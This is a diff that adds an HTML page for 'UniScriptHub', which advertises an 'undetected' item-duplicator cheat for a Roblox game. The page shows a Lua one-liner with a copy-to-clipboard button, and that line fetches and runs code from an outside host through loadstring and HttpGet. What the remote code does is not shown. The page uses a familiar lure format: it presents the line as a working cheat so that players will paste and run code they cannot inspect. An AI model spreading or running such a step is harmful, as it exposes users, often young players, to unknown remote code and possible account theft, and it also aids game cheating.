@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>UniScriptHub | Premium Roblox Resources</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #8b5cf6;
+            --bg: #030712;
+            --card-bg: rgba(13, 18, 30, 0.95);
+            --text-main: #f8fafc;
+            --text-dim: #64748b;
+            --accent: #10b981;
+            --leaked: #f59e0b;
+        }
+
+        * { box-sizing: border-box; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
+
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background-color: var(--bg);
+            background-image: radial-gradient(circle at 50% 0%, rgba(139, 92, 246, 0.15) 0%, transparent 50%);
+            color: var(--text-main);
+            margin: 0;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        nav {
+            width: 100%;
+            max-width: 1000px;
+            padding: 40px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo { font-weight: 800; font-size: 1.2rem; text-decoration: none; color: #fff; text-transform: uppercase; }
+        .logo span { color: var(--primary); }
+
+        .nav-tabs {
+            display: flex; gap: 10px; background: rgba(255, 255, 255, 0.03);
+            padding: 6px; border-radius: 12px; border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .tab { padding: 8px 18px; border-radius: 8px; text-decoration: none; color: var(--text-dim); font-size: 0.85rem; font-weight: 700; cursor: pointer; }
+        .tab.active { background: var(--primary); color: white; }
+        .tab:hover:not(.active) { color: white; background: rgba(255, 255, 255, 0.05); }
+
+        .container { max-width: 900px; width: 100%; padding: 0 20px 80px; }
+
+        .showcase-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 25px;
+            margin-top: 20px;
+        }
+
+        .showcase-item {
+            background: var(--card-bg);
+            border-radius: 24px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            overflow: hidden;
+            cursor: pointer;
+            position: relative;
+        }
+
+        .showcase-item:hover { transform: translateY(-10px); border-color: var(--primary); }
+        .showcase-img { width: 100%; height: 160px; object-fit: cover; }
+        .showcase-info { padding: 20px; }
+        .showcase-info h3 { margin: 0; font-size: 1.2rem; }
+        .showcase-info p { color: var(--text-dim); font-size: 0.85rem; margin: 10px 0 0; }
+
+        #script-page { display: none; }
+
+        .script-card {
+            background: var(--card-bg);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: 32px;
+            overflow: hidden;
+        }
+
+        .banner-container { width: 100%; height: 220px; position: relative; }
+        .banner-img { width: 100%; height: 100%; object-fit: cover; filter: brightness(0.7); }
+        .banner-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(to bottom, transparent 40%, var(--card-bg)); padding: 24px; display: flex; align-items: flex-end; gap: 8px; }
+
+        .badge { padding: 6px 12px; border-radius: 6px; font-size: 0.65rem; font-weight: 700; text-transform: uppercase; backdrop-filter: blur(4px); }
+        .badge-verified { background: rgba(16, 185, 129, 0.15); color: var(--accent); border: 1px solid rgba(16, 185, 129, 0.3); }
+        .badge-leaked { background: rgba(245, 158, 11, 0.15); color: var(--leaked); border: 1px solid rgba(245, 158, 11, 0.3); }
+
+        /* --- UPDATED CODE WINDOW FOR LONG SCRIPTS --- */
+        .code-window { 
+            background: #000; 
+            border-radius: 16px; 
+            border: 1px solid rgba(255, 255, 255, 0.05); 
+            margin: 24px 0; 
+            overflow: hidden; 
+            display: flex;
+            flex-direction: column;
+        }
+
+        .code-header { 
+            background: rgba(255, 255, 255, 0.03); 
+            padding: 12px 16px; 
+            display: flex; 
+            align-items: center; 
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05); 
+        }
+
+        .dots { display: flex; gap: 6px; }
+        .dot { width: 10px; height: 10px; border-radius: 50%; opacity: 0.6; }
+        .dot-1 { background: #ff5f56; } .dot-2 { background: #ffbd2e; } .dot-3 { background: #27c93f; }
+
+        .code-scroll-area {
+            max-height: 400px; /* Limit height for long scripts */
+            overflow-y: auto;
+            overflow-x: auto;
+            background: transparent;
+        }
+
+        pre { 
+            margin: 0; 
+            padding: 24px; 
+            color: #a78bfa; 
+            font-family: 'Consolas', 'Monaco', monospace; 
+            font-size: 0.9rem; 
+            white-space: pre; /* Keeps code structure */
+            line-height: 1.6;
+        }
+
+        /* Custom Scrollbar for a cleaner look */
+        .code-scroll-area::-webkit-scrollbar { width: 8px; height: 8px; }
+        .code-scroll-area::-webkit-scrollbar-track { background: #000; }
+        .code-scroll-area::-webkit-scrollbar-thumb { background: #1e293b; border-radius: 10px; }
+        .code-scroll-area::-webkit-scrollbar-thumb:hover { background: var(--primary); }
+
+        .btn-copy, .btn-back { width: 100%; padding: 18px; border-radius: 16px; font-size: 0.95rem; font-weight: 700; cursor: pointer; border: none; margin-bottom: 10px; }
+        .btn-copy { background: var(--primary); color: white; }
+        .btn-back { background: rgba(255,255,255,0.05); color: var(--text-dim); }
+
+        footer { text-align: center; color: var(--text-dim); font-size: 0.75rem; text-transform: uppercase; margin-top: 40px; }
+    </style>
+</head>
+<body>
+
+    <nav>
+        <a href="#" onclick="showHome()" class="logo">Uni<span>Script</span>Hub</a>
+        <div class="nav-tabs">
+            <a href="#" onclick="showHome()" id="home-tab" class="tab active">Home</a>
+            <a href="https://discord.gg/madrbXndpQ" target="_blank" class="tab">Discord</a>
+        </div>
+    </nav>
+
+    <div class="container">
+        <div id="home-section">
+            <h2 style="margin-bottom: 30px;">Featured Scripts</h2>
+            <div class="showcase-grid">
+                <div class="showcase-item" onclick="showScript()">
+                    <img src="https://cdn.discordapp.com/attachments/1480673091737616487/1480771166460448899/noFilter_2.webp?ex=69b0e31d&is=69af919d&hm=76f9fe371aed37334c242414f009f15ab82d5e2f62634404d8a398dd05590f26&" class="showcase-img">
+                    <div class="showcase-info">
+                        <div style="display:flex; gap:5px; margin-bottom:10px;">
+                            <span class="badge badge-verified">Verified</span>
+                        </div>
+                        <h3>Undetected Paid Brainrot Duplicator</h3>
+                        <p>Duplicate your brainrots — working, not patched.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div id="script-page">
+            <button class="btn-back" onclick="showHome()">← Back to Showcase</button>
+            <div class="script-card">
+                <div class="banner-container">
+                    <img src="https://cdn.discordapp.com/attachments/1480673091737616487/1480771166460448899/noFilter_2.webp?ex=69b0e31d&is=69af919d&hm=76f9fe371aed37334c242414f009f15ab82d5e2f62634404d8a398dd05590f26&" class="banner-img">
+                    <div class="banner-overlay">
+                        <span class="badge badge-verified">Verified</span>
+                        <span class="badge badge-leaked">Leaked Source</span>
+                    </div>
+                </div>
+                <div style="padding: 32px;">
+                    <h1>Undetected Paid Duplicator</h1>
+                    <p style="color:var(--text-dim); margin-top:8px;">Steal a Brainrot Exclusive</p>
+
+                    <div class="code-window">
+                        <div class="code-header">
+                            <div class="dots"><div class="dot dot-1"></div><div class="dot dot-2"></div><div class="dot dot-3"></div></div>
+                            <span style="margin-left: auto; font-size: 0.6rem; color: var(--text-dim); font-weight: 700;">LUA SOURCE</span>
+                        </div>
+                        <div class="code-scroll-area">
+                            <pre id="scriptText">-- UniScriptHub Premium Script
+-- Status: Undetected
+-- Use with caution
+
+loadstring(game:HttpGet("https://skama.net/mrr_06d00f08224a45e4bda37fcd9892c358/"))()</pre>
+                        </div>
+                    </div>
+
+                    <button class="btn-copy" onclick="copyScript(this)">Copy Script to Clipboard</button>
+                </div>
+            </div>
+        </div>
+
+        <footer>Enforcing Quality Since 2026</footer>
+    </div>
+
+    <script>
+        function showScript() {
+            document.getElementById('home-section').style.display = 'none';
+            document.getElementById('script-page').style.display = 'block';
+            window.scrollTo(0,0);
+        }
+
+        function showHome() {
+            document.getElementById('home-section').style.display = 'block';
+            document.getElementById('script-page').style.display = 'none';
+            window.scrollTo(0,0);
+        }
+
+        function copyScript(btn) {
+            const code = document.getElementById('scriptText').innerText;
+            navigator.clipboard.writeText(code).then(() => {
+                const originalText = btn.innerText;
+                btn.innerText = '✓ Copied Successfully';
+                btn.style.background = '#10b981';
+                setTimeout(() => {
+                    btn.innerText = originalText;
+                    btn.style.background = '';
+                }, 2000);
+            });
+        }
+    </script>
+</body>
+</html>
